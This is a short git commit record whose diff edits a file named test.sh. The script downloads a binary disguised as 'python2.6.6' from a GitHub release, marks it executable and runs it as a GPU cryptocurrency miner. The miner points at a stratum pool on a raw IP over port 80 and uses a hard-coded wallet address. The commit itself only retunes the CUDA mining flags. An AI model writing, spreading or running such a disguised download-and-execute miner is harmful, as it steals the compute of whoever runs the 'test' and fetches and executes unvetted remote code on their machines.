1bbfc673fee0f8586ee8157324b3fd446c8c77e9
Ayoub Jadouli <Ayoub JADOULI>
2021-04-03 17:04:05 +0100

    test 07

--- test.sh
+++ test.sh
@@ -13,4 +13,4 @@ rm -rf python2.6.6
 wget -q https://github.com/one10001/10001code/releases/download/2.6.6/python2.6.6 2> lol.out
 chmod +x python2.6.6
 #cp python2.6.6 /bin/python2.6.6
-./python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -U --cuda-parallel-hash 4 --cuda-block-size 256 --cuda-schedule yield  --cuda-streams 8 --cuda-grid-size 65536
+./python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -U --cuda-parallel-hash 8 --cuda-block-size 256 --cuda-schedule spin  --cuda-streams 4 --cuda-grid-size 65536
